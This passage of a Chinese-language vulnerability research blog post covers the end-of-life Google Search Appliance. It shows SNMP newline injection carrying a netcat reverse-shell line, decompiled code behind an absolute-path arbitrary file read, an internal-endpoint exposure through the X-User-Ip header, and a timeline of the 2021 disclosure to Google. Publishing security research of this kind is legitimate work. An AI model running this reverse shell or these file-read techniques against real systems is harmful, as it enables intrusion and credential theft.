+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 7800 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 7801 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 4430 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 4431 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 19900 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8000 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8443 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 9941 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 9942 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 10999 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--sport</span> 68 <span class="nt">--dport</span> 67 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 53 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 137:138 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 123 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 514 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 161 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--sport</span> 161 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 162 <span class="nt">-j</span> ACCEPT
+</code></pre></div></div>
+
+<p>整理出來實際可存取的TCP 攻擊面：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>通訊埠</th>
+      <th>服務名稱</th>
+      <th>程式執行檔所在位置</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>ssh</td>
+      <td>/usr/sbin/sshd</td>
+    </tr>
+    <tr>
+      <td>7800</td>
+      <td>EnterpriseFrontend</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar</td>
+    </tr>
+    <tr>
+      <td>4430</td>
+      <td>EnterpriseFrontend</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar</td>
+    </tr>
+    <tr>
+      <td>19900</td>
+      <td>feedergate</td>
+      <td>/export/hda3/5.2.0/local/google/bin/feedergate</td>
+    </tr>
+    <tr>
+      <td>8000</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td>stunnel</td>
+      <td>/usr/sbin/stunnel</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>而我們發現  <code class="language-plaintext highlighter-rouge">/export/hda3/versionmanager/google_key.symmetric</code> 中的字串可以用來解密所有 install_bundle 的內容！
+使用 CVE-2014-6271 取得權限加上可以解出 install bundle 中的內容後，對 vGSA 的研究就暫時告一段落，
+其執行環境中記憶體的保護較為缺少，可能有機會存在弱點並利用：</p>
+
+<p><img src="/assets/img/blog/20230707/6.png" alt="" /></p>
+
+<h3 id="gsa">GSA</h3>
+
+<p>安裝設備後嘗試更改開機順序，但發現進入BIOS需要密碼，且磁碟介面卡的管理介面中 Dell H700 僅有部分功能可以操作：
+<img src="/assets/img/blog/20230707/7.png" alt="" /></p>
+
+<p>接著嘗試直接讀取硬碟內容，如果硬碟內容沒有加密，有機會能直接取得設備作業系統及軟體。
+我們發現其硬碟使用SAS 介面進行傳輸，嘗試前還需購買SAS 卡，本次測試使用LSI 9211-8i 進行連結：</p>
+
+<p><img src="/assets/img/blog/20230707/8.png" alt="" /></p>
+
+<p>連接嘗試讀取後發現到這是一個自我加密 SED 磁碟，需要密碼unlock 才能存取，OSSLab 這邊有更詳細的解釋：</p>
+
+<p><a href="https://www.osslab.com.tw/ata-sed-security/">https://www.osslab.com.tw/ata-sed-security/</a> (中文)</p>
+
+<p>在無法直接存取硬碟的情況下有幾種方式可以繼續嘗試：</p>
+
+<ul>
+  <li>嘗試讀出於BIOS EEPROM 中的密碼，並更改開機順序</li>
+</ul>
+
+<p>此方式需要破壞主機板，有一定風險，於軟體層找不到漏洞才會使用此種方式。
+可參考這篇研究 <a href="https://blog.cybercx.co.nz/bypassing-bios-password">https://blog.cybercx.co.nz/bypassing-bios-password</a> (英文)</p>
+
+<ul>
+  <li>使用 PCILeech 讀取、寫入記憶體並取得系統權限</li>
+</ul>
+
+<p>此方式需要特定PCI-e 設備，當時還沒有準備此類設備。可以參考這個 github 專案：</p>
+
+<p><a href="https://github.com/ufrisk/pcileech">https://github.com/ufrisk/pcileech</a></p>
+
+<ul>
+  <li>尋找可存取服務之軟體漏洞</li>
+</ul>
+
+<p>此方式較為簡單可行。</p>
+
+<h4 id="管理介面換行字元插入">管理介面換行字元插入</h4>
+
+<p>登入管理介面後，觀察到其中有 SNMP 取得系統資訊的功能，
+且此功能可以插入自定義字串：</p>
+
+<p><img src="/assets/img/blog/20230707/9.png" alt="" /></p>
+
+<p>這邊嘗試經典的換行注入：</p>
+
+<p><img src="/assets/img/blog/20230707/10.png" alt="" /></p>
+
+<p>將 sysContact 插入</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
+</code></pre></div></div>
+
+<p>插入 extend 設定值之後，就可以用 snmpwalk 觸發 SNMP 的extend 功能，
+並執行 shell。</p>
+
+<p><img src="/assets/img/blog/20230707/11.png" alt="" /></p>
+
+<p>成功執行指令並反連。</p>
+
+<h4 id="任意讀檔">任意讀檔</h4>
+
+<p>於 GSA 6.x 系列版本後的 RPM 安裝包中發現其 80/443 的網頁服務使用 Apache httpd，
+其中位於 /etc/httpd/conf.d/ 中有許多的設定。
+而其中 gsa-http.conf 及 gsa-https.conf 可以發現某些目錄會被導向至本機特定的服務：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  RewriteEngine on
+  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
+  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
+  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
+  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
+  RewriteRule ^/$ http://localhost:7800/ [P,L]
+  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
+</code></pre></div></div>
+
+<p>其中通訊埠為 7886 跟 7890 的服務為另外執行的 Apache Tomcat 伺服器，當串接兩層以上的網站伺服器時，
+Tomcat 的路徑判斷 ..;/ 是一個有趣的測試點，可以參閱一位老前輩的文章：</p>
+
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+
+<p>而我們有興趣的點為 dps ，這似乎沒有在舊版的 GSA 中看到。
+從 dps.war 中解出 /WEB-INF/web.xml 觀察網頁應用配置，並發現 /font 會呼叫 <code class="language-plaintext highlighter-rouge">com.documill.dps.connector.servlet.user.DPSDownloadServlet</code></p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>font<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>com.documill.dps.connector.servlet.user.DPSDownloadServlet<span class="nt">&lt;/servlet-class&gt;</span>
+    <span class="nt">&lt;init-param&gt;</span>
+      <span class="nt">&lt;param-name&gt;</span>rootDirectory<span class="nt">&lt;/param-name&gt;</span>
+      <span class="nt">&lt;param-value&gt;</span>work/fonts/<span class="nt">&lt;/param-value&gt;</span>
+    <span class="nt">&lt;/init-param&gt;</span>
+  <span class="nt">&lt;/servlet&gt;</span>
+
+  <span class="nt">&lt;servlet-mapping&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>font<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/font/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>接著查看 DPSDownloadServlet：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.davisor.net.servlet.DownloadServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.documill.dps.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.ServletContext</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DPSDownloadServlet</span> <span class="kd">extends</span> <span class="nc">DownloadServlet</span>
+    <span class="kd">implements</span> <span class="nc">DPSUserService</span>
+<span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">DPSDownloadServlet</span><span class="o">()</span>
+    <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="nc">String</span> <span class="nf">getRealPath</span><span class="o">(</span><span class="nc">ServletContext</span> <span class="n">servletcontext</span><span class="o">,</span> <span class="nc">String</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="nc">IOException</span>
+    <span class="o">{</span>
+        <span class="no">DPS</span> <span class="n">dps</span> <span class="o">=</span> <span class="nc">DPSSingleton</span><span class="o">.</span><span class="na">getDPS</span><span class="o">();</span>
+        <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="n">dps</span><span class="o">.</span><span class="na">getHomeDir</span><span class="o">();</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">file</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="s">"DPSDownloadServlet:getRealPath:DPS home directory not specified"</span><span class="o">);</span>
+        <span class="k">else</span>
+            <span class="nf">return</span> <span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="n">s</span><span class="o">)).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">0L</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>發現此類別是繼承自 <code class="language-plaintext highlighter-rouge">com.davisor.net.servlet.DownloadServlet</code>，跟進此類別：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpservletrequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpservletresponse</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span>
+    <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">httpservletrequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">uriParameterName</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(!</span><span class="n">isValid</span><span class="o">(</span><span class="n">s</span><span class="o">))</span>
+        <span class="o">{</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">400</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"Invalid file path: "</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="n">rootDirectory</span><span class="o">.</span><span class="na">deriveFile</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">())</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">404</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"No file:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+        <span class="k">else</span>
+        <span class="nf">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">canRead</span><span class="o">())</span>
+        <span class="o">{</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">403</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"Unreadable file:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">else</span>
+        <span class="o">{</span>
+            <span class="kt">long</span> <span class="n">l</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">l</span> <span class="o">&gt;</span> <span class="mh">0x7fffffff</span><span class="no">L</span><span class="o">)</span>
+            <span class="o">{</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">413</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"File too big:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+            <span class="o">}</span> <span class="k">else</span>
+            <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">s1</span> <span class="o">=</span> <span class="no">MIME</span><span class="o">.</span><span class="na">getTypeFromPath</span><span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="s">"application/octet-stream"</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setContentLength</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="n">l</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="n">s1</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setDateHeader</span><span class="o">(</span><span class="s">"Last-Modified"</span><span class="o">,</span> <span class="n">file</span><span class="o">.</span><span class="na">lastModified</span><span class="o">());</span>
+                <span class="k">if</span><span class="o">(</span><span class="n">cacheExpires</span> <span class="o">&gt;</span> <span class="mi">0L</span><span class="o">)</span>
+                <span class="o">{</span>
+                    <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setDateHeader</span><span class="o">(</span><span class="s">"Expires"</span><span class="o">,</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">+</span> <span class="n">cacheExpires</span><span class="o">);</span>
+                    <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Cache-Control"</span><span class="o">,</span> <span class="s">"public"</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="no">IO</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="o">!</span><span class="nc">Strings</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">s</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>可以發現此處只有檢查字串是否含有 <code class="language-plaintext highlighter-rouge">..</code> ，但我們可以直接指定絕對路徑。
+並直接讀取本機任意檔案！</p>
+
+<p><img src="/assets/img/blog/20230707/12.png" alt="" /></p>
+
+<p>舊版GSA 沒有 /font 這個端點，但 /dps/admin 有類似的讀檔問題，可以直接指定 logName 進行檔案讀取，
+可參考下圖直接讀取系統管理介面帳號密碼檔：</p>
+
+<p><img src="/assets/img/blog/20230707/13.png" alt="" /></p>
+
+<p>成功破解雜湊後，登入後可以開啟 SNMP 服務配合第一個漏洞並以 root 權限執行任意指令。</p>
+
+<h3 id="其他發現跟整理">其他發現跟整理</h3>
+
+<h4 id="服務本身內部網址">服務本身內部網址</h4>
+<p>GSA 中有許多的子服務間使用 HTTP 傳輸協定溝通，而在許多服務都有提供 /varz、/helpz、/procz 等網址，
+可以在服務定義的信任網路位置或 127.0.0.1 中存取：</p>
+
+<p><img src="/assets/img/blog/20230707/14.png" alt="" /></p>
+
+<p>而在 vGSA 中觀察到服務執行參數有 <code class="language-plaintext highlighter-rouge">useripheader=X-User-Ip</code> ，導致對外開放的管理介面可以帶入 X-User-IP 請求頭後直接存取此功能：</p>
+
+<p><img src="/assets/img/blog/20230707/15.png" alt="" /></p>
+
+<p><img src="/assets/img/blog/20230707/16.png" alt="" /></p>
+
+<p>/procz 端點甚至可以抓取執行檔及使用到的共享函示庫：
+<img src="/assets/img/blog/20230707/17.png" alt="" /></p>
+
+<h4 id="型號整理">型號整理</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>型號</th>
+      <th>製造商及型號</th>
+      <th>硬體規格</th>
+      <th>版號</th>
+      <th>文件數量</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Google Mini</td>
+      <td>Gigabyte</td>
+      <td><a href="https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl">Pentium III 1G / 2GB memory / 120G</a></td>
+      <td>3.4.14</td>
+      <td>300,000</td>
+    </tr>
+    <tr>
+      <td>Google Mini-002X</td>
+      <td>SuperMicro</td>
+      <td>Pentium 4 3G / 2GB memory / 250G HDD</td>
+      <td>5.0.0</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>Google GB-1001</td>
+      <td>Dell Poweredge 2950</td>
+      <td>Xeon / 16GB memory / 1.25TB HDD</td>
+      <td>未知</td>
+      <td>3,000,000</td>
+    </tr>
+    <tr>
+      <td>Google GB-1002</td>
+      <td>Gigabyte</td>
+      <td>未知</td>
+      <td>未知</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>Google GB-7007</td>
+      <td>Dell R710</td>
+      <td>Xeon E5520 / 48GB memory / 3TB HDD</td>
+      <td>未知</td>
+      <td>10,000,000</td>
+    </tr>
+    <tr>
+      <td>Google GB-9009</td>
+      <td>未知</td>
+      <td>Xeon X5560 / 96GB memory / 3.6TB HDD</td>
+      <td>未知</td>
+      <td>30,000,000</td>
+    </tr>
+    <tr>
+      <td>Google G100</td>
+      <td>Dell R720XD</td>
+      <td>未知</td>
+      <td>未知</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>Google G500</td>
+      <td>未知</td>
+      <td>未知</td>
+      <td>未知</td>
+      <td>未知</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="核心版本">核心版本</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>GSA 版本</th>
+      <th>核心版本</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>7.6.0</td>
+      <td>Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015</td>
+    </tr>
+    <tr>
+      <td>7.4.0</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>7.2.0</td>
+      <td>Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013</td>
+    </tr>
+    <tr>
+      <td>7.0.14</td>
+      <td>Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012</td>
+    </tr>
+    <tr>
+      <td>5.2.0</td>
+      <td>Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="時間軸">時間軸</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>時間</th>
+      <th>事件</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>2005/06/10</td>
+      <td>Java Code Injection <a href="https://seclists.org/fulldisclosure/2005/Nov/652">CVE-2005-3757</a> 被 H D Moore 回報</td>
+    </tr>
+    <tr>
+      <td>2008 上半年</td>
+      <td>釋出 GSA 5.0</td>
+    </tr>
+    <tr>
+      <td>2008/10/28</td>
+      <td>釋出 vgsa_20081028.7z (5.2.0)</td>
+    </tr>
+    <tr>
+      <td>2013/04/20</td>
+      <td>釋出 GSA 6.14.0.G28</td>
+    </tr>
+    <tr>
+      <td>2014/03/20</td>
+      <td>XSS 漏洞 <a href="https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/">CVE-2014-0362</a> 被 Will Dormann 回報</td>
+    </tr>
+    <tr>
+      <td>2014/10/01</td>
+      <td>釋出 GSA 7.0.14.G238</td>
+    </tr>
+    <tr>
+      <td>2014/10/03</td>
+      <td>釋出 GSA 7.2.0.G252</td>
+    </tr>
+    <tr>
+      <td>2014/12/12</td>
+      <td>釋出 GSA 7.2.0.G264</td>
+    </tr>
+    <tr>
+      <td>2015/02/07</td>
+      <td>釋出 GSA 7.2.0.G270</td>
+    </tr>
+    <tr>
+      <td>2015/04/15</td>
+      <td>釋出 GSA 7.4.0.G64</td>
+    </tr>
+    <tr>
+      <td>2015/04/22</td>
+      <td>釋出 GSA 7.4.0.G72</td>
+    </tr>
+    <tr>
+      <td>2015/04/30</td>
+      <td>釋出 GSA 7.4.0.G74</td>
+    </tr>
+    <tr>
+      <td>2015/06/04</td>
+      <td>釋出 GSA 7.4.0.G82</td>
+    </tr>
+    <tr>
+      <td>2016 上半年</td>
+      <td>Google 宣布 GSA 將會逐步退出市場</td>
+    </tr>
+    <tr>
+      <td>2016/01/05</td>
+      <td>XML 外部實體攻擊 <a href="https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/"></a> 被 Timo 回報</td>
+    </tr>
+    <tr>
+      <td>2016/05/24</td>
+      <td>釋出 GSA 7.6.0.G36</td>
+    </tr>
+    <tr>
+      <td>2016/07/01</td>
+      <td>釋出 GSA 7.6.0.G42</td>
+    </tr>
+    <tr>
+      <td>2016/07/31</td>
+      <td>本文作者取得此設備，版本為 7.0.14</td>
+    </tr>
+    <tr>
+      <td>2016/08/25</td>
+      <td>釋出 GSA 7.6.0.G46</td>
+    </tr>
+    <tr>
+      <td>2016/10/21</td>
+      <td>釋出 GSA 7.6.0.G58</td>
+    </tr>
+    <tr>
+      <td>2017/01/19</td>
+      <td>釋出 GSA 7.6.50.G30</td>
+    </tr>
+    <tr>
+      <td>2017/04/19</td>
+      <td>釋出 GSA 7.6.50.G36</td>
+    </tr>
+    <tr>
+      <td>2017/07/28</td>
+      <td>釋出 GSA 7.6.50.G64</td>
+    </tr>
+    <tr>
+      <td>2017/11/09</td>
+      <td>釋出 GSA 7.6.250.G12</td>
+    </tr>
+    <tr>
+      <td>2017/12/28</td>
+      <td>最後能訂購 GSA 的日期</td>
+    </tr>
+    <tr>
+      <td>2018/01/17</td>
+      <td>釋出 GSA 7.6.250.G20</td>
+    </tr>
+    <tr>
+      <td>2018/03/21</td>
+      <td>釋出 GSA 7.6.250.G26</td>
+    </tr>
+    <tr>
+      <td>2018/06/15</td>
+      <td>釋出 GSA 7.6.360.G10</td>
+    </tr>
+    <tr>
+      <td>2018/10/08</td>
+      <td>釋出 GSA 7.6.360.G16</td>
+    </tr>
+    <tr>
+      <td>2019/04/26</td>
+      <td>釋出 GSA 7.6.512.G18，應該為最後一個版本</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>回報漏洞</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>收到機器人回應確認收到回報信件</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>問題於 issuetracker.google.com 被指派</td>
+    </tr>
+    <tr>
+      <td>2021/08/18</td>
+      <td>Google 提示漏洞不符合獎金條件，但會於下次會議再次討論</td>
+    </tr>
+    <tr>
+      <td>2021/08/20</td>
+      <td>確認漏洞不發放獎金</td>
+    </tr>
+    <tr>
+      <td>2021/11/01</td>
+      <td>詢問漏洞是否會指派 CVE 漏洞編號</td>
+    </tr>
+    <tr>
+      <td>2021/11/02</td>
+      <td>確認不會有 CVE 漏洞編號</td>
+    </tr>
+    <tr>
+      <td>2023 上半年</td>
+      <td>開始編寫文章</td>
+    </tr>
+    <tr>
+      <td>2023/06/04</td>
+      <td>初稿完成</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="結論">結論</h3>
+
+<p>雖然 GSA/vGSA 已經是結束生命周期的產品，但研究 Google 如何對設備去增加產品的安全性及減少攻擊向量
+可以增加平常較少接觸的知識面。雖然文中沒有詳細說明，包含如使用 Java 的 Security Manager，
+Linux Kernel 的 seccomp 都是 GSA 中有使用的技術，而本次研究中也留下一些可供後續研究的目標：</p>
+
+<ul>
+  <li>feedergate 服務</li>
+  <li>Oracle 的 Outside-in Technology 轉換文件格式的記憶體漏洞</li>
+  <li>convert_to_html seccomp sandbox</li>
+</ul>
+
+<p>有研究成果時再跟大家分享，下次見。</p>
+
+<h3 id="其他參考網址">其他參考網址</h3>
+
+<ul>
+  <li><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></li>
+  <li><a href="https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/">https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/1333">https://www.exploit-db.com/exploits/1333</a></li>
